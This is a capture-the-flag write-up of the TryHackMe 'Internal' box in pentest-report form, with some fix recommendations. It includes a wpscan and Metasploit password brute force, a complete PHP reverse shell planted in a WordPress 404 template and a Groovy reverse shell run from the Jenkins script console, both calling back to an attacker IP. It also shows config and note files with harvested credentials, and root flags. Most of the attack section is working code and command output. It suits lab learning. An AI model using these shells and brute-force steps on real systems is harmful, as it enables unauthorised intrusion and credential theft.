Links: [[TryHackMe Boxes]]
#linux 

### System IP: internal.thm

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
internal.thm     | **TCP**: 22,80

**Nmap Scan Results:**

```
 Nmap 7.91 scan initiated Fri Feb 19 20:12:30 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/ttl0/autorecon/results/10.10.196.17/scans/_full_tcp_nmap.txt -oX /home/ttl0/autorecon/results/10.10.196.17/scans/xml/_full_tcp_nmap.xml 10.10.196.17
nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/ttl0/autorecon/results/10.10.196.17/scans/_full_tcp_nmap.txt -oX /home/ttl0/autorecon/results/10.10.196.17/scans/xml/_full_tcp_nmap.xml 10.10.196.17

Nmap scan report for 10.10.196.17
Host is up, received user-set (0.096s latency).
Scanned at 2021-02-19 20:12:31 EST for 286s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw=
|   256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=34367%PV=Y%DS=2%DC=T%G=Y%TM=6030631
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M5
OS:06ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O
OS:6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%D
OS:F=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 32.160 days (since Mon Jan 18 16:26:24 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   94.55 ms 10.9.0.1
2   94.64 ms 10.10.196.17

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 19 20:17:17 2021 -- 1 IP address (1 host up) scanned in 287.23 seconds

```

**Web Enumeration Results:**
Gobuster found the following directories:
```
/blog (Status: 301) [Size: 311]
/index.html (Status: 200) [Size: 10918]
/index.html (Status: 200) [Size: 10918]
/javascript (Status: 301) [Size: 317]
/phpmyadmin (Status: 301) [Size: 317]
/server-status (Status: 403) [Size: 277]
/wordpress (Status: 301) [Size: 316]

```

We found a wordpress login page at /blog and a phpmyadmin login page at /phpmyadmin

**Initial Shell Vulnerability Exploited:**
We try default username for wordpress *admin* with password *admin* We get the following error message saying that the password is incorrect for username *admin*:

![](20210220170517.png)

We use the username *root* with the password *root*. The error message returned is different saying that the username is unknown:

![](20210220170659.png)

This means that username admin is valid.  We use wpscan to bruteforce the password with password list rockyou.txt:

```
─$ wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50

```

We get a match for password
```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                                                                                
Trying admin / luciana Time: 00:01:51 <                                                                                                                                                           > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Feb 20 16:45:51 2021
[+] Requests Done: 3953
[+] Cached Requests: 5
[+] Data Sent: 1.923 MB
[+] Data Received: 2.588 MB
[+] Memory used: 235.516 MB
[+] Elapsed time: 00:02:08

```

We login to Wordpress using credentials admin, password my2boys. We browse through the menu Appearance -> Theme Editor -> 404 Template. We edit the file to put a reverse PHP shell code, here's the edited file:
```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.9.0.123';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since 1.0
 * @version 1.0
 */

get_header(); ?>

<div class="wrap">
	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

			<section class="error-404 not-found">
				<header class="page-header">
					<h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'twentyseventeen' ); ?></h1>
				</header><!-- .page-header -->
				<div class="page-content">
					<p><?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentyseventeen' ); ?></p>

					<?php get_search_form(); ?>

				</div><!-- .page-content -->
			</section><!-- .error-404 -->
		</main><!-- #main -->
	</div><!-- #primary -->
</div><!-- .wrap -->

<?php get_footer();

```

We start a netcat listener:
```
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

We browse to the reverse shell page:
```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

We get a reverse shell:
```
listening on [any] 1337 ...
connect to [10.9.0.123] from (UNKNOWN) [10.10.223.59] 54260
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:03:29 up 34 min,  0 users,  load average: 0.00, 0.37, 1.78
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

**Vulnerability Exploited:**
Weak password used for default user.

**Vulnerability Explanation:**
We were able to brute-force the Wordpress login credentials due to the default user being enabled paired with the fact that the password was weak. The default user was confirmed as Wordpress gives us a different error message if the user does not exist.

**Vulnerability Fix:**
Use strong passwords for all users. Changing the user could help slow down the attack but this field can still be enumerated through the information Wordpress returns when the username does not exist.

**Severity:**
Critical

#### Privilege Escalation to user

Through enumeration we see that we have access to read the config of phpmyadmin:
```
ww-data@internal:/tmp$ cat /etc/phpmyadmin/config-db.php
<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
```

We can login to the PHP server with those credentials:
```
www-data@internal:/tmp$ mysql -u phpmyadmin -p             
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 22788
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

```

We do some more digging and try and find credentials for our only other user *aubreanna*. We search recursively to find any file containing that name and we find a file containing the password for *aubreanna*:
```
cd /
www-data@internal:/$ grep -rn aubreanna 2>/dev/null
opt/wp-save.txt:5:aubreanna:bubb13guM!@#123

www-data@internal:/$ cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

```

We try and log in with those credentials:
```
www-data@internal:/$ su aubreanna
Password: 
aubreanna@internal:/$ 
```

**Vulnerability Exploited:**
Password left in clear text format.

**Vulnerability Explanation:**
We found a note containing aubreanna password in clear text format on a file accessible by all users. We were also able to recover the mysql password from the phpmyadmin service from the config file.

**Vulnerability Fix:**
Do not leave passwords in clear text form accessible for all users.

**Severity:**
High

**Proof Screenshot Here:**

![](20210220190336.png)

**Proof.txt Contents:**
```
aubreanna@internal:~$ Hostname && echo %username% && type root.txt && ipconfig /a

Command 'Hostname' not found, did you mean:

  command 'hostname' from deb hostname

Try: apt install <deb name>

internal
aubreanna
THM{int3rna1_fl4g_1}
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:3b:4b:f0:e9:fb brd ff:ff:ff:ff:ff:ff
    inet 10.10.223.59/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3417sec preferred_lft 3417sec
    inet6 fe80::3b:4bff:fef0:e9fb/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:1e:66:62:b9 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:1eff:fe66:62b9/64 scope link 
       valid_lft forever preferred_lft forever
5: veth4c9c80f@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 6a:d5:b7:cb:40:38 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::68d5:b7ff:fecb:4038/64 scope link 
       valid_lft forever preferred_lft forever
```

#### Privilege Escalation to root

Looking through *aubreanna* home directory, we find a text file saying that Jenkins is running on 172.17.0.2:8080 :

```
aubreanna@internal:~$ pwd
/home/aubreanna
aubreanna@internal:~$ ls -lah
total 384K
drwx------ 8 aubreanna aubreanna 4.0K Feb 21 00:09 .
drwxr-xr-x 3 root      root      4.0K Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3.7K Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4.0K Aug  3  2020 .cache
drwxr-x--- 3 aubreanna aubreanna 4.0K Feb 21 00:04 .config
drwx------ 4 aubreanna aubreanna 4.0K Feb 21 00:05 .gnupg
drwx------ 3 aubreanna aubreanna 4.0K Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4.0K Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rw------- 1 aubreanna aubreanna 1.5K Feb 21 00:09 .viminfo
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
-rwxrwxr-x 1 aubreanna aubreanna 318K Feb 21 00:04 linpeas.sh
drwx------ 3 aubreanna aubreanna 4.0K Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080

```

We indeed see that the port is reachable and open:
```
aubreanna@internal:~$ telnet 172.17.0.2 8080
Trying 172.17.0.2...
Connected to 172.17.0.2.
Escape character is '^]'.
```

We create an SSH tunnel from our machine to be able to run enumeration:
```
ssh -L 8080:localhost:8080 aubreanna@internal.thm
```

We are able to get to the login page of Jenkins:

![](20210220210130.png)

We use msfconsole "scanner/http/jenkins_login" module to bruteforce the password of Jenkins. A bit of research shows us that the default username for Jenkins is "admin" so we try bruteforcing with this username first. We use the following options:

```
msf6 auxiliary(scanner/http/jenkins_login) > options

Module options (auxiliary/scanner/http/jenkins_login):

   Name              Current Setting                   Required  Description
   ----              ---------------                   --------  -----------
   BLANK_PASSWORDS   false                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                             no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                             no        Add all users in the current database to the list
   HTTP_METHOD       POST                              yes       The HTTP method to use for the login (Accepted: GET, POST)
   LOGIN_URL         /j_acegi_security_check           yes       The URL that handles the login process
   PASSWORD                                            no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/rockyou.txt  no        File containing passwords, one per line
   Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            localhost                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             8080                              yes       The target port (TCP)
   SSL               false                             no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                             yes       Stop guessing when a credential works for a host
   THREADS           1                                 yes       The number of concurrent threads (max one per host)
   USERNAME          admin                             no        A specific username to authenticate as
   USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                             no        Try the username as the password for all users
   USER_FILE                                           no        File containing usernames, one per line
   VERBOSE           true                              yes       Whether to print output for all attempts
   VHOST                                               no        HTTP server virtual host

```

After a few minutes we get a hit:
```
msf6 auxiliary(scanner/http/jenkins_login) > 
[+] 127.0.0.1:80

80 - Login Successful: admin:spongebob
```

We login with those credentials by going to the webpage at localhost:8080 and login with those credentials successfully:

![](20210220221727.png)

We go to Manage Jenkins -> Script Console. Enter the following information to get a remote shell:
```
String host="10.9.0.123";
int port=31337;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

We start a nc listener:
```
└─$ nc -lvnp 31337
listening on [any] 31337 ...

```

We go back to Jenkins and "run" the script. We get a shell:
```
whoami
jenkins
```

Through enumeration we find a note in /opt; the same folder that we found the original password for *aubreanna*. This time it has the password for root:
```
jenkins@jenkins:/var$ cd /opt
jenkins@jenkins:/opt$ ls
note.txt
jenkins@jenkins:/opt$ cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

```

We try the credentials listed at the end of note. We get root:
```
aubreanna@internal:~$ su -
Password: 
root@internal:~# whoami
root

```

**Vulnerability Exploited:**
Weak password used for default user and a clear-text password was found in a text file.

**Vulnerability Explanation:**
We found a docker container running on the target machine that was running a webserver using Jenkins. We were able to brute-force the Jenkins login credentials due to the default user being enabled paired with the fact that the password was weak. We then found the password for root in clear-text note file on the server.

**Vulnerability Fix:**
Disable default user on Jenkins and use another user with a strong password instead. Do not leave passwords in clear text in folders accessible by all users.

**Severity:**
High

**Proof Screenshot Here:**

![](20210220220913.png)

**Proof.txt Contents:**

```
root@internal:~# cat /root/root.txt
THM{d0ck3r_d3str0y3r}
root@internal:~# hostname && whoami && cat root.txt && ip a
internal
root
THM{d0ck3r_d3str0y3r}
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:3b:4b:f0:e9:fb brd ff:ff:ff:ff:ff:ff
    inet 10.10.223.59/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3267sec preferred_lft 3267sec
    inet6 fe80::3b:4bff:fef0:e9fb/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:1e:66:62:b9 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:1eff:fe66:62b9/64 scope link 
       valid_lft forever preferred_lft forever
5: veth4c9c80f@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 6a:d5:b7:cb:40:38 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::68d5:b7ff:fecb:4038/64 scope link 
       valid_lft forever preferred_lft forever

```